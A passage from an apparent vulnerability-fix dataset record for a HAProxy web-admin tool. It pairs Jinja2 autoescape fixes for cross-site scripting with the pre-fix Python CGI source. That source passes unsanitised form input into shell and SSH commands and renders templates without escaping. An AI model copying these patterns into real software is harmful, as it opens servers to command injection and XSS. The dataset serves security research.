sql.get_setting('proxy')\n\tos.system(\"cp scripts/%s .\" % script)\n\t\n\tproxy_serv = proxy if proxy is not None else \"\"\n\t\t\n\tcommands = [ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+\"/\"+script +\" PROXY=\" + proxy_serv+ \n\t\t\t\t\" SOCK_PORT=\"+haproxy_sock_port+\" STAT_PORT=\"+stats_port+\" STAT_FILE=\"+server_state_file+\n\t\t\t\t\" STATS_USER=\"+stats_user+\" STATS_PASS=\"+stats_password ]\n\t\n\terror = str(upload(serv, tmp_config_path, script))\n\tif error:\n\t\tprint('error: '+error)\n\t\t\n\tos.system(\"rm -f %s\" % script)\n\tssh_command(serv, commands, print_out=\"1\")\n\t\n\tif kwargs.get('syn_flood') == \"1\":\n\t\tsyn_flood_protect(serv)\n\t\ndef syn_flood_protect(serv, **kwargs):\n\timport sql\n\tscript = \"syn_flood_protect.sh\"\n\ttmp_config_path = sql.get_setting('tmp_config_path')\n\t\n\tenable = \"disable\" if kwargs.get('enable') == \"0\" else \"disable\"\n\n\tos.system(\"cp scripts/%s .\" % script)\n\t\n\tcommands = [ \"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+ \" \"+enable ]\n\t\n\terror = str(upload(serv, tmp_config_path, script))\n\tif error:\n\t\tprint('error: '+error)\n\tos.system(\"rm -f %s\" % script)\n\tssh_command(serv, commands, print_out=\"1\")\n\t\ndef waf_install(serv, **kwargs):\n\timport sql\n\tscript = \"waf.sh\"\n\ttmp_config_path = sql.get_setting('tmp_config_path')\n\tproxy = sql.get_setting('proxy')\n\thaproxy_dir = sql.get_setting('haproxy_dir')\n\tver = check_haproxy_version(serv)\n\n\tos.system(\"cp scripts/%s .\" % script)\n\t\n\tcommands = [ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+script +\" PROXY=\" + proxy+ \n\t\t\t\t\" HAPROXY_PATH=\"+haproxy_dir +\" VERSION=\"+ver ]\n\t\n\terror = str(upload(serv, tmp_config_path, script))\n\tif error:\n\t\tprint('error: '+error)\n\tos.system(\"rm -f %s\" % script)\n\t\n\tstderr = ssh_command(serv, commands, print_out=\"1\")\n\tif stderr is None:\n\t\tsql.insert_waf_metrics_enable(serv, \"0\")\n\ndef check_haproxy_version(serv):\n\timport sql\n\thaproxy_sock_port = sql.get_setting('haproxy_sock_port')\n\tver = \"\"\n\tcmd=\"echo 'show info' |nc %s %s |grep Version |awk '{print $2}'\" % (serv, haproxy_sock_port)\n\toutput, stderr = subprocess_execute(cmd)\n\tfor line in output:\n\t\tver = line\n\treturn ver\n\t\ndef upload(serv, path, file, **kwargs):\n\terror = \"\"\n\tfull_path = path + file\n\n\tif kwargs.get('dir') == \"fullpath\":\n\t\tfull_path = path\n\t\n\ttry:\n\t\tssh = ssh_connect(serv)\n\texcept Exception as e:\n\t\terror = e\n\t\tpass\n\ttry:\n\t\tsftp = ssh.open_sftp()\n\t\tfile = sftp.put(file, full_path)\n\t\tsftp.close()\n\t\tssh.close()\n\texcept Exception as e:\n\t\terror = e\n\t\tpass\n\t\t\n\treturn error\n\t\ndef upload_and_restart(serv, cfg, **kwargs):\n\timport sql\n\ttmp_file = sql.get_setting('tmp_config_path') + \"/\" + get_data('config') + \".cfg\"\n\terror = \"\"\n\t\n\ttry:\n\t\tos.system(\"dos2unix \"+cfg)\n\texcept OSError:\n\t\treturn 'Please install dos2unix' \n\t\tpass\n\t\n\tif kwargs.get(\"keepalived\") == 1:\n\t\tif kwargs.get(\"just_save\") == \"save\":\n\t\t\tcommands = [ \"sudo mv -f \" + tmp_file + \" /etc/keepalived/keepalived.conf\" ]\n\t\telse:\n\t\t\tcommands = [ \"sudo mv -f \" + tmp_file + \" /etc/keepalived/keepalived.conf && sudo systemctl restart keepalived\" ]\n\telse:\n\t\tif kwargs.get(\"just_save\") == \"test\":\n\t\t\tcommands = [ \"sudo haproxy  -q -c -f \" + tmp_file + \"&& sudo rm -f \" + tmp_file ]\n\t\telif kwargs.get(\"just_save\") == \"save\":\n\t\t\tcommands = [ \"sudo haproxy  -q -c -f \" + tmp_file + \"&& sudo mv -f \" + tmp_file + \" \" + sql.get_setting('haproxy_config_path') ]\n\t\telse:\n\t\t\tcommands = [ \"sudo haproxy  -q -c -f \" + tmp_file + \"&& sudo mv -f \" + tmp_file + \" \" + sql.get_setting('haproxy_config_path') + \" && sudo \" + sql.get_setting('restart_command') ]\t\n\t\tif sql.get_setting('firewall_enable') == \"1\":\n\t\t\tcommands.extend(open_port_firewalld(cfg))\n\t\n\terror += str(upload(serv, tmp_file, cfg, dir='fullpath'))\n\n\ttry:\n\t\terror += ssh_command(serv, commands)\n\texcept Exception as e:\n\t\terror += e\n\tif error:\n\t\treturn error\n\t\t\ndef open_port_firewalld(cfg):\n\ttry:\n\t\tconf = open(cfg, \"r\")\n\texcept IOError:\n\t\tprint('<div class=\"alert alert-danger\">Can\\'t read export config file</div>')\n\t\n\tfirewalld_commands = []\n\t\n\tfor line in conf:\n\t\tif \"bind\" in line:\n\t\t\tbind = line.split(\":\")\n\t\t\tbind[1] = bind[1].strip(' ')\n\t\t\tbind = bind[1].split(\"ssl\")\n\t\t\tbind = bind[0].strip(' \\t\\n\\r')\n\t\t\tfirewalld_commands.append('sudo firewall-cmd --zone=public --add-port=%s/tcp --permanent' % bind)\n\t\t\t\t\n\tfirewalld_commands.append('sudo firewall-cmd --reload')\n\treturn firewalld_commands\n\t\ndef check_haproxy_config(serv):\n\timport sql\n\tcommands = [ \"haproxy  -q -c -f %s\" % sql.get_setting('haproxy_config_path') ]\n\tssh = ssh_connect(serv)\n\tfor command in commands:\n\t\tstdin , stdout, stderr = ssh.exec_command(command, get_pty=True)\n\t\tif not stderr.read():\n\t\t\treturn True\n\t\telse:\n\t\t\treturn False\n\tssh.close()\n\t\t\ndef show_log(stdout):\n\ti = 0\n\tfor line in stdout:\n\t\ti = i + 1\n\t\tline_class = \"line3\" if i % 2 == 0 else \"line\"\n\t\tprint('<div class=\"'+line_class+'\">' + escape_html(line) + '</div>')\n\t\t\t\ndef show_ip(stdout):\n\tfor line in stdout:\n\t\tprint(line)\n\t\t\ndef server_status(stdout):\t\n\tproc_count = \"\"\n\t\n\tfor line in stdout:\n\t\tif \"Ncat: \" not in line:\n\t\t\tfor k in line:\n\t\t\t\tproc_count = k.split(\":\")[1]\n\t\telse:\n\t\t\tproc_count = 0\n\treturn proc_count\t\t\n\ndef ssh_command(serv, commands, **kwargs):\n\tssh = ssh_connect(serv)\n\t\t  \n\tfor command in commands:\n\t\ttry:\n\t\t\tstdin, stdout, stderr = ssh.exec_command(command, get_pty=True)\n\t\texcept:\n\t\t\tcontinue\n\t\t\t\t\n\t\tif kwargs.get(\"ip\") == \"1\":\n\t\t\tshow_ip(stdout)\n\t\telif kwargs.get(\"show_log\") == \"1\":\n\t\t\tshow_log(stdout)\n\t\telif kwargs.get(\"server_status\") == \"1\":\n\t\t\tserver_status(stdout)\n\t\telif kwargs.get('print_out'):\n\t\t\tprint(stdout.read().decode(encoding='UTF-8'))\n\t\t\treturn stdout.read().decode(encoding='UTF-8')\n\t\telif kwargs.get('retunr_err') == 1:\n\t\t\treturn stderr.read().decode(encoding='UTF-8')\n\t\telse:\n\t\t\treturn stdout.read().decode(encoding='UTF-8')\n\t\t\t\n\t\tfor line in stderr.read().decode(encoding='UTF-8'):\n\t\t\tif line:\n\t\t\t\tprint(\"<div class='alert alert-warning'>\"+line+\"</div>\")\n\ttry:\t\n\t\tssh.close()\n\texcept:\n\t\tprint(\"<div class='alert alert-danger' style='margin: 0;'>\"+str(ssh)+\"<a title='Close' id='errorMess'><b>X</b></a></div>\")\n\t\tpass\n\ndef escape_html(text):\n\treturn cgi.escape(text, quote=True)\n\t\ndef subprocess_execute(cmd):\n\timport subprocess \n\tp = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True)\n\tstdout, stderr = p.communicate()\n\toutput = stdout.splitlines()\n\t\n\treturn output, stderr\n\ndef show_backends(serv, **kwargs):\n\timport json\n\timport sql\n\thaproxy_sock_port = sql.get_setting('haproxy_sock_port')\n\tcmd='echo \"show backend\" |nc %s %s' % (serv, haproxy_sock_port)\n\toutput, stderr = subprocess_execute(cmd)\n\tret = \"\"\n\tfor line in output:\n\t\tif \"#\" in  line or \"stats\" in line:\n\t\t\tcontinue\n\t\tif line != \"\":\n\t\t\tback = json.dumps(line).split(\"\\\"\")\n\t\t\tif kwargs.get('ret'):\n\t\t\t\tret += back[1]\n\t\t\t\tret += \"<br />\"\n\t\t\telse:\n\t\t\t\tprint(back[1], end=\"<br>\")\n\t\t\n\tif kwargs.get('ret'):\n\t\treturn ret\n\t\t\ndef get_files(dir = get_config_var('configs', 'haproxy_save_configs_dir'), format = 'cfg', **kwargs):\n\timport glob\n\tfile = set()\n\treturn_files = set()\n\t\n\tfor files in glob.glob(os.path.join(dir,'*.'+format)):\t\t\t\t\n\t\tfile.add(files.split('/')[-1])\n\tfiles = sorted(file, reverse=True)\n\n\tif format == 'cfg':\n\t\tfor file in files:\n\t\t\tip = file.split(\"-\")\n\t\t\tif serv == ip[0]:\n\t\t\t\treturn_files.add(file)\n\t\treturn sorted(return_files, reverse=True)\n\telse: \n\t\treturn files\n\t\ndef get_key(item):\n\treturn item[0]"}, "/app/options.py": {"changes": [{"diff": "\n if act == \"showCompareConfigs\":\n \timport glob\n \tfrom jinja2 import Environment, FileSystemLoader\n-\tenv = Environment(loader=FileSystemLoader('templates/ajax'))\n+\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True)\n \ttemplate = env.get_template('/show_compare_configs.html')\n \tleft = form.getvalue('left')\n \tright = form.getvalue('right')\n", "add": 1, "remove": 1, "filename": "/app/options.py", "badparts": ["\tenv = Environment(loader=FileSystemLoader('templates/ajax'))"], "goodparts": ["\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True)"]}, {"diff": "\n \thap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')\n \tcmd='diff -ub %s%s %s%s' % (hap_configs_dir, left, hap_configs_dir, right)\t\n-\tenv = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"])\n+\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True, extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"])\n \ttemplate = env.get_template('compare.html')\n \t\n \toutput, stderr = funct.subprocess_execute(cmd)\n", "add": 1, "remove": 1, "filename": "/app/options.py", "badparts": ["\tenv = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"])"], "goodparts": ["\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True, extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"])"]}, {"diff": "\n \ttry:\n \t\tconf = open(cfg, \"r\")\n+\t\t#conf = conf.read()\n+\t\t#conf = funct.escape_html(conf)\n \texcept IOError:\n \t\tprint('<div class=\"alert alert-danger\">Can\\'t read import config file</div>')\n \t\t\n \tfrom jinja2 import Environment, FileSystemLoader\n-\tenv = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols'])\n+\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True, extensions=['jinja2.ext.loopcontrols'])\n \ttemplate = env.get_template('config_show.html')\n \t\n \ttemplate = template.render(conf=conf, view=form.getvalue('view'), serv=serv, configver=form.getvalue('configver'), role=funct.is_admin(level=2))\t\t\t\t\t\t\t\t\t", "add": 3, "remove": 1, "filename": "/app/options.py", "badparts": ["\tenv = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols'])"], "goodparts": ["\tenv = Environment(loader=FileSystemLoader('templates/ajax'), autoescape=True, extensions=['jinja2.ext.loopcontrols'])"]}], "source": "\n import cgi import os, sys import funct import sql import ovw form=cgi.FieldStorage() serv=form.getvalue('serv') act=form.getvalue('act') \t print('Content-type: text/html\\n') if act==\"checkrestart\": \tservers=sql.get_dick_permit(ip=serv) \tfor server in servers: \t\tif server !=\"\": \t\t\tprint(\"ok\") \t\t\tsys.exit() \tsys.exit() if form.getvalue('token') is None: \tprint(\"What the fuck?! U r hacker Oo?!\") \tsys.exit() \t\t if form.getvalue('getcerts') is not None and serv is not None: \tcert_path=sql.get_setting('cert_path') \tcommands=[ \"ls -1t \"+cert_path+\" |grep pem\"] \ttry: \t\tfunct.ssh_command(serv, commands, ip=\"1\") \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') if form.getvalue('checkSshConnect') is not None and serv is not None: \ttry: \t\tfunct.ssh_command(serv,[\"ls -1t\"]) \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') \t\t if form.getvalue('getcert') is not None and serv is not None: \tid=form.getvalue('getcert') \tcert_path=sql.get_setting('cert_path') \tcommands=[ \"cat \"+cert_path+\"/\"+id] \ttry: \t\tfunct.ssh_command(serv, commands, ip=\"1\") \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') \t\t if form.getvalue('ssh_cert'): \tname=form.getvalue('name') \t \tif not os.path.exists(os.getcwd()+'/keys/'): \t\tos.makedirs(os.getcwd()+'/keys/') \t \tssh_keys=os.path.dirname(os.getcwd())+'/keys/'+name+'.pem' \t \ttry: \t\twith open(ssh_keys, \"w\") as conf: \t\t\tconf.write(form.getvalue('ssh_cert')) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssh keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert alert-success\">Ssh key was save into: %s </div>' % ssh_keys) \ttry: \t\tfunct.logging(\"local\", \"users.py \texcept: \t\tpass \t\t\t if serv and form.getvalue('ssl_cert'): \tcert_local_dir=funct.get_config_var('main', 'cert_local_dir') \tcert_path=sql.get_setting('cert_path') \t \tif not os.path.exists(cert_local_dir): \t\tos.makedirs(cert_local_dir) \t \tif form.getvalue('ssl_name') is None: \t\tprint('<div class=\"alert alert-danger\">Please enter desired name</div>') \telse: \t\tname=form.getvalue('ssl_name') +'.pem' \t \ttry: \t\twith open(name, \"w\") as ssl_cert: \t\t\tssl_cert.write(form.getvalue('ssl_cert')) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssl keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert alert-success\">SSL file was upload to %s into: %s </div>' %(serv, cert_path)) \t\t \tMASTERS=sql.is_master(serv) \tfor master in MASTERS: \t\tif master[0] !=None: \t\t\tfunct.upload(master[0], cert_path, name) \ttry: \t\tfunct.upload(serv, cert_path, name) \texcept: \t\tpass \t \tos.system(\"mv %s %s\" %(name, cert_local_dir)) \tfunct.logging(serv, \"add.py \t if form.getvalue('backend') is not None: \tfunct.show_backends(serv) \t if form.getvalue('ip') is not None and serv is not None: \tcommands=[ \"sudo ip a |grep inet |egrep -v '::1' |awk '{ print $2 }' |awk -F'/' '{ print $1 }'\"] \tfunct.ssh_command(serv, commands, ip=\"1\") \t if form.getvalue('showif'): \tcommands=[\"sudo ip link|grep 'UP' | awk '{print $2}' |awk -F':' '{print $1}'\"] \tfunct.ssh_command(serv, commands, ip=\"1\") \t if form.getvalue('action_hap') is not None and serv is not None: \taction=form.getvalue('action_hap') \t \tif funct.check_haproxy_config(serv): \t\tcommands=[ \"sudo systemctl %s haproxy\" % action] \t\tfunct.ssh_command(serv, commands)\t\t \t\tprint(\"HAproxy was %s\" % action) \telse: \t\tprint(\"Bad config, check please\") \t if form.getvalue('action_waf') is not None and serv is not None: \tserv=form.getvalue('serv') \taction=form.getvalue('action_waf') \tcommands=[ \"sudo systemctl %s waf\" % action] \tfunct.ssh_command(serv, commands)\t\t \t if act==\"overview\": \tovw.get_overview() \t if act==\"overviewwaf\": \tovw.get_overviewWaf(form.getvalue('page')) \t if act==\"overviewServers\": \tovw.get_overviewServers() \t if form.getvalue('action'): \timport requests \tfrom requests_toolbelt.utils import dump \t \thaproxy_user=sql.get_setting('stats_user') \thaproxy_pass=sql.get_setting('stats_password') \tstats_port=sql.get_setting('stats_port') \tstats_page=sql.get_setting('stats_page') \t \tpostdata={ \t\t'action': form.getvalue('action'), \t\t's': form.getvalue('s'), \t\t'b': form.getvalue('b') \t} \theaders={ \t\t'User-Agent': 'Mozilla/5.0(Windows NT 5.1; rv:20.0) Gecko/20100101 Firefox/20.0', \t\t'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', \t\t'Accept-Language': 'en-US,en;q=0.5', \t\t'Accept-Encoding': 'gzip, deflate' \t} \tq=requests.post('http://'+serv+':'+stats_port+'/'+stats_page, headers=headers, data=postdata, auth=(haproxy_user, haproxy_pass)) \t if serv is not None and act==\"stats\": \timport requests \tfrom requests_toolbelt.utils import dump \t \thaproxy_user=sql.get_setting('stats_user') \thaproxy_pass=sql.get_setting('stats_password') \tstats_port=sql.get_setting('stats_port') \tstats_page=sql.get_setting('stats_page') \ttry: \t\tresponse=requests.get('http://%s:%s/%s' %(serv, stats_port, stats_page), auth=(haproxy_user, haproxy_pass)) \texcept requests.exceptions.ConnectTimeout: \t\tprint('Oops. Connection timeout occured!') \texcept requests.exceptions.ReadTimeout: \t\tprint('Oops. Read timeout occured') \texcept requests.exceptions.HTTPError as errh: \t\tprint(\"Http Error:\",errh) \texcept requests.exceptions.ConnectionError as errc: \t\tprint('<div class=\"alert alert-danger\">Error Connecting: %s</div>' % errc) \texcept requests.exceptions.Timeout as errt: \t\tprint(\"Timeout Error:\",errt) \texcept requests.exceptions.RequestException as err: \t\tprint(\"OOps: Something Else\",err) \t\t \tdata=response.content \tprint(data.decode('utf-8')) if serv is not None and form.getvalue('rows') is not None: \trows=form.getvalue('rows') \twaf=form.getvalue('waf') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \t \tif grep is not None: \tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \tsyslog_server_enable=sql.get_setting('syslog_server_enable') \tif syslog_server_enable is None or syslog_server_enable==\"0\": \t\tlocal_path_logs=sql.get_setting('local_path_logs') \t\tsyslog_server=serv\t \t\tcommands=[ \"sudo cat %s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(local_path_logs, date, date1, rows, grep_act, grep)]\t\t \telse: \t\tcommands=[ \"sudo cat /var/log/%s/syslog.log | sed '/ %s:00/,/ %s:00/! d' |tail -%s %s %s\" %(serv, date, date1, rows, grep_act, grep)] \t\tsyslog_server=sql.get_setting('syslog_server') \t \tif waf==\"1\": \t\tlocal_path_logs='/var/log/modsec_audit.log' \t\tcommands=[ \"sudo cat %s |tail -%s %s %s\" %(local_path_logs, rows, grep_act, grep)]\t \t\t \tfunct.ssh_command(syslog_server, commands, show_log=\"1\") \t if serv is not None and form.getvalue('rows1') is not None: \trows=form.getvalue('rows1') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \tapache_log_path=sql.get_setting('apache_log_path') \t \tif grep is not None: \t\tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \t\t \tif serv=='haproxy-wi.access.log': \t\tcmd=\"cat %s| awk -F\\\"/|:\\\" '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep) \telse: \t\tcmd=\"cat %s| awk '$4>\\\"%s:00\\\" && $4<\\\"%s:00\\\"' |tail -%s %s %s\" %(apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep) \toutput, stderr=funct.subprocess_execute(cmd) \tfunct.show_log(output) \tprint(stderr) \t\t if form.getvalue('viewlogs') is not None: \tviewlog=form.getvalue('viewlogs') \tlog_path=funct.get_config_var('main', 'log_path') \trows=form.getvalue('rows2') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \t \tif grep is not None: \t\tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \tcmd=\"cat %s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(log_path +viewlog, date, date1, rows, grep_act, grep) \toutput, stderr=funct.subprocess_execute(cmd) \tfunct.show_log(output) \tprint(stderr) \t\t if serv is not None and act==\"showMap\": \tovw.get_map(serv) \t if form.getvalue('servaction') is not None: \tserver_state_file=sql.get_setting('server_state_file') \thaproxy_sock=sql.get_setting('haproxy_sock') \tenable=form.getvalue('servaction') \tbackend=form.getvalue('servbackend')\t \tcmd='echo \"%s %s\" |sudo socat stdio %s | cut -d \",\" -f 1-2,5-10,18,34-36 | column -s, -t' %(enable, backend, haproxy_sock) \t \tif form.getvalue('save')==\"on\": \t\tsave_command='echo \"show servers state\" | sudo socat stdio %s > %s' %(haproxy_sock, server_state_file) \t\tcommand=[ cmd, save_command] \telse: \t\tcommand=[ cmd] \t\t \tif enable !=\"show\": \t\tprint('<center><h3>You %s %s on HAproxy %s. <a href=\"viewsttats.py?serv=%s\" title=\"View stat\" target=\"_blank\">Look it</a> or <a href=\"edit.py\" title=\"Edit\">Edit something else</a></h3><br />' %(enable, backend, serv, serv)) \t\t\t \tfunct.ssh_command(serv, command, show_log=\"1\") \taction='edit.py ' +enable +' ' +backend \tfunct.logging(serv, action) if act==\"showCompareConfigs\": \timport glob \tfrom jinja2 import Environment, FileSystemLoader \tenv=Environment(loader=FileSystemLoader('templates/ajax')) \ttemplate=env.get_template('/show_compare_configs.html') \tleft=form.getvalue('left') \tright=form.getvalue('right') \t \ttemplate=template.render(serv=serv, right=right, left=left, return_files=funct.get_files())\t\t\t\t\t\t\t\t\t \tprint(template) \t if serv is not None and form.getvalue('right') is not None: \tfrom jinja2 import Environment, FileSystemLoader \tleft=form.getvalue('left') \tright=form.getvalue('right') \thap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir') \tcmd='diff -ub %s%s %s%s' %(hap_configs_dir, left, hap_configs_dir, right)\t \tenv=Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"]) \ttemplate=env.get_template('compare.html') \t \toutput, stderr=funct.subprocess_execute(cmd) \ttemplate=template.render(stdout=output)\t \t \tprint(template) \tprint(stderr) \t if serv is not None and act==\"configShow\": \thap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir') \t \tif form.getvalue('configver') is None:\t \t\tcfg=hap_configs_dir +serv +\"-\" +funct.get_data('config') +\".cfg\" \t\tfunct.get_config(serv, cfg) \telse: \t\tcfg=hap_configs_dir +form.getvalue('configver') \t\t\t \ttry: \t\tconf=open(cfg, \"r\") \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t read import config file</div>') \t\t \tfrom jinja2 import Environment, FileSystemLoader \tenv=Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols']) \ttemplate=env.get_template('config_show.html') \t \ttemplate=template.render(conf=conf, view=form.getvalue('view'), serv=serv, configver=form.getvalue('configver'), role=funct.is_admin(level=2))\t\t\t\t\t\t\t\t\t\t\t \tprint(template) \t \tif form.getvalue('configver') is None: \t\tos.system(\"/bin/rm -f \" +cfg)\t \t\t if form.getvalue('master'): \tmaster=form.getvalue('master') \tslave=form.getvalue('slave') \tinterface=form.getvalue('interface') \tvrrpip=form.getvalue('vrrpip') \ttmp_config_path=sql.get_setting('tmp_config_path') \tscript=\"install_keepalived.sh\" \t \tif form.getvalue('hap')==\"1\": \t\tfunct.install_haproxy(master) \t\tfunct.install_haproxy(slave) \t\t \tif form.getvalue('syn_flood')==\"1\": \t\tfunct.syn_flood_protect(master) \t\tfunct.syn_flood_protect(slave) \t \tos.system(\"cp scripts/%s.\" % script) \t\t \terror=str(funct.upload(master, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\tsys.exit() \tfunct.upload(slave, tmp_config_path, script) \tfunct.ssh_command(master,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip]) \tfunct.ssh_command(slave,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"+interface+\" \"+vrrpip]) \t\t\t \tos.system(\"rm -f %s\" % script) \tsql.update_server_master(master, slave) \t if form.getvalue('masteradd'): \tmaster=form.getvalue('masteradd') \tslave=form.getvalue('slaveadd') \tinterface=form.getvalue('interfaceadd') \tvrrpip=form.getvalue('vrrpipadd') \tkp=form.getvalue('kp') \ttmp_config_path=sql.get_setting('tmp_config_path') \tscript=\"add_vrrp.sh\" \t \tos.system(\"cp scripts/%s.\" % script) \t\t \terror=str(funct.upload(master, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\tsys.exit() \tfunct.upload(slave, tmp_config_path, script) \t \tfunct.ssh_command(master,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip+\" \"+kp]) \tfunct.ssh_command(slave,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"+interface+\" \"+vrrpip+\" \"+kp]) \t\t\t \tos.system(\"rm -f %s\" % script) \t if form.getvalue('haproxyaddserv'): \tfunct.install_haproxy(form.getvalue('haproxyaddserv'), syn_flood=form.getvalue('syn_flood')) \t if form.getvalue('installwaf'): \tfunct.waf_install(form.getvalue('installwaf')) \t if form.getvalue('metrics_waf'): \tsql.update_waf_metrics_enable(form.getvalue('metrics_waf'), form.getvalue('enable')) \t\t if form.getvalue('table_metrics'): \timport http.cookies \tfrom jinja2 import Environment, FileSystemLoader \tenv=Environment(loader=FileSystemLoader('templates/ajax')) \ttemplate=env.get_template('table_metrics.html') \t\t \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \ttable_stat=sql.select_table_metrics(user_id.value) \ttemplate=template.render(table_stat=sql.select_table_metrics(user_id.value))\t\t\t\t\t\t\t\t\t\t\t \tprint(template) \t\t if form.getvalue('metrics'): \tfrom datetime import timedelta \tfrom bokeh.plotting import figure, output_file, show \tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker \tfrom bokeh.layouts import widgetbox, gridplot \tfrom bokeh.models.widgets import Button, RadioButtonGroup, Select \timport pandas as pd \timport http.cookies \t\t \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \tservers=sql.select_servers_metrics(user_id.value) \tservers=sorted(servers) \t \tp={} \tfor serv in servers: \t\tserv=serv[0] \t\tp[serv]={} \t\tmetric=sql.select_metrics(serv) \t\tmetrics={} \t\t \t\tfor i in metric: \t\t\trep_date=str(i[5]) \t\t\tmetrics[rep_date]={} \t\t\tmetrics[rep_date]['server']=str(i[0]) \t\t\tmetrics[rep_date]['curr_con']=str(i[1]) \t\t\tmetrics[rep_date]['curr_ssl_con']=str(i[2]) \t\t\tmetrics[rep_date]['sess_rate']=str(i[3]) \t\t\tmetrics[rep_date]['max_sess_rate']=str(i[4]) \t\tdf=pd.DataFrame.from_dict(metrics, orient=\"index\") \t\tdf=df.fillna(0) \t\tdf.index=pd.to_datetime(df.index) \t\tdf.index.name='Date' \t\tdf.sort_index(inplace=True) \t\tsource=ColumnDataSource(df) \t\t \t\toutput_file(\"templates/metrics_out.html\", mode='inline') \t\t \t\tx_min=df.index.min() -pd.Timedelta(hours=1) \t\tx_max=df.index.max() +pd.Timedelta(minutes=1) \t\tp[serv]=figure( \t\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\",\t\t \t\t\ttitle=metric[0][0], \t\t\tx_axis_type=\"datetime\", y_axis_label='Connections', \t\t\tx_range=(x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000) \t\t\t) \t\t\t \t\thover=HoverTool( \t\t\ttooltips=[ \t\t\t\t(\"Connections\", \"@curr_con\"), \t\t\t\t(\"SSL connections\", \"@curr_ssl_con\"), \t\t\t\t(\"Sessions rate\", \"@sess_rate\") \t\t\t], \t\t\tmode='mouse' \t\t) \t\t \t\tp[serv].ygrid.band_fill_color=\" \t\tp[serv].ygrid.band_fill_alpha=0.9 \t\tp[serv].y_range.start=0 \t\tp[serv].y_range.end=int(df['curr_con'].max()) +150 \t\tp[serv].add_tools(hover) \t\tp[serv].title.text_font_size=\"20px\"\t\t\t\t\t\t \t\tp[serv].line(\"Date\", \"curr_con\", source=source, alpha=0.5, color=' \t\tp[serv].line(\"Date\", \"curr_ssl_con\", source=source, alpha=0.5, color=\" \t\tp[serv].line(\"Date\", \"sess_rate\", source=source, alpha=0.5, color=\" \t\tp[serv].legend.orientation=\"horizontal\" \t\tp[serv].legend.location=\"top_left\" \t\tp[serv].legend.padding=5 \tplots=[] \tfor key, value in p.items(): \t\tplots.append(value) \t\t \tgrid=gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location=\"left\", toolbar_options=dict(logo=None)) \tshow(grid) \t if form.getvalue('waf_metrics'): \tfrom datetime import timedelta \tfrom bokeh.plotting import figure, output_file, show \tfrom bokeh.models import ColumnDataSource, HoverTool, 